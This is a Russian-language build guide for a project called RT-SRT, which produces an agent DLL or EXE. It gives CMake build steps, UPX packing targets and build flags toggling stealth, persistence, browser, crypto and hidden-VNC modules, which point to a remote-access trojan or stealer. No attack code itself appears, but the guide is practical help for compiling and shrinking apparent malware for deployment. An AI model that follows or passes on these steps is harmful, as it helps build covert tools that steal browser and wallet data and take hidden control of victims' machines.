# RT-SRT Build Instructions

## ⚠️ ВАЖНО: Правильный порядок сборки

**Сжатие производится ПОСЛЕ сборки, не до!**

UPX сжимает уже собранный исполняемый файл (.exe/.dll), а не исходный код.

## 🔄 Правильная последовательность

### 1️⃣ Настройка сборки
```bash
mkdir build
cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
```

### 2️⃣ Сборка проекта
```bash
# Полная оптимизированная сборка
cmake --build . --config Release --parallel

# ИЛИ быстрая debug сборка
cmake --build . --config Debug --parallel
```

### 3️⃣ Проверка результата
```bash
# Показать размер файла до сжатия
ls -la build/rt_srt_agent.dll

# Получить детальный отчет
cmake --build . --target build_report
```

### 4️⃣ Сжатие (ТОЛЬКО после сборки!)
```bash
# Стандартное сжатие (рекомендуется)
cmake --build . --target pack_agent

# Максимальное сжатие (медленнее, но меньше размер)
cmake --build . --target pack_aggressive
```

## 🚀 Быстрые команды

### Полный цикл сборки и упаковки
```bash
# Один командный файл для всего процесса
cmake --build . --target build_and_pack
```

### Только сборка (без сжатия)
```bash
# Release версия
cmake --build . --target release_build

# Debug версия  
cmake --build . --target quick_build
```

### Полная пересборка
```bash
# Очистка и новая сборка
cmake --build . --target clean_build
cmake .. -DCMAKE_BUILD_TYPE=Release
cmake --build . --parallel
```

## 📊 Ожидаемые размеры

| Этап | Размер | Описание |
|------|--------|----------|
| **Исходная сборка (Debug)** | ~800KB - 1.5MB | Неоптимизированная версия |
| **Release сборка** | ~400KB - 800KB | Оптимизированная версия |
| **После UPX (standard)** | ~150KB - 300KB | Сжатие ~60-70% |
| **После UPX (aggressive)** | ~100KB - 200KB | Максимальное сжатие ~80% |

## ⚙️ Опции сборки

### Включение/выключение модулей
```bash
# Минимальная сборка (только stealth + persistence)
cmake .. -DCMAKE_BUILD_TYPE=Release \
         -DENABLE_BROWSER_MODULE=OFF \
         -DENABLE_CRYPTO_MODULE=OFF \
         -DENABLE_HVNC_MODULE=OFF

# Максимальная сборка (все модули)
cmake .. -DCMAKE_BUILD_TYPE=Release \
         -DENABLE_BROWSER_MODULE=ON \
         -DENABLE_CRYPTO_MODULE=ON \
         -DENABLE_PERSISTENCE_MODULE=ON \
         -DENABLE_STEALTH_MODULE=ON \
         -DENABLE_HVNC_MODULE=ON
```

### Тип сборки
```bash
# EXE вместо DLL
cmake .. -DBUILD_AS_EXE=ON

# DLL (по умолчанию)  
cmake .. -DBUILD_AS_EXE=OFF
```

## 🛠️ Требования

### Обязательные
- **CMake 3.16+**
- **MSVC 2019+** или **GCC 9+** или **Clang 10+**
- **Windows SDK** (для Windows builds)

### Опциональные (для сжатия)
- **UPX** - для сжатия исполняемых файлов
  - Download: https://upx.github.io/
  - После установки перезапустите CMake

### Проверка наличия UPX
```bash
# Проверить установку UPX
upx --version

# Если UPX не найден, targets pack_* будут недоступны
cmake .. # покажет warning если UPX отсутствует
```

## ❌ Частые ошибки

### ❌ Неправильно: сжатие до сборки
```bash
# НЕПРАВИЛЬНО!
cmake --build . --target pack_agent  # Файл еще не собран!
cmake --build . --parallel           # Сборка после попытки сжатия
```

### ✅ Правильно: сборка, затем сжатие
```bash
# ПРАВИЛЬНО!
cmake --build . --parallel           # Сначала сборка
cmake --build . --target pack_agent  # Затем сжатие
```

### ❌ Сжатие Debug версии
```bash
# НЕЭФФЕКТИВНО!
cmake .. -DCMAKE_BUILD_TYPE=Debug    # Debug версия большая
cmake --build . --parallel
cmake --build . --target pack_agent  # Сжимается плохо
```

### ✅ Сжатие Release версии
```bash
# ЭФФЕКТИВНО!
cmake .. -DCMAKE_BUILD_TYPE=Release  # Release версия уже оптимизирована
cmake --build . --parallel
cmake --build . --target pack_agent  # Отличное сжатие
```

## 📝 Логи и отладка

### Детальный отчет о сборке
```bash
cmake --build . --target build_report
```

### Проверка размеров
```bash
# До сжатия
ls -la build/rt_srt_agent.dll

# После сжатия (сравнить)
ls -la build/rt_srt_agent.dll
```

### Проверка модулей
```bash
cmake --build . --target module_test
```

## 🎯 Рекомендуемый workflow

```bash
# 1. Настройка
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release

# 2. Сборка
cmake --build . --parallel

# 3. Проверка
cmake --build . --target build_report

# 4. Сжатие (если нужно)
cmake --build . --target pack_agent

# 5. Финальная проверка
ls -la rt_srt_agent.dll
```

**Помните: Сжатие = последний шаг после успешной сборки!**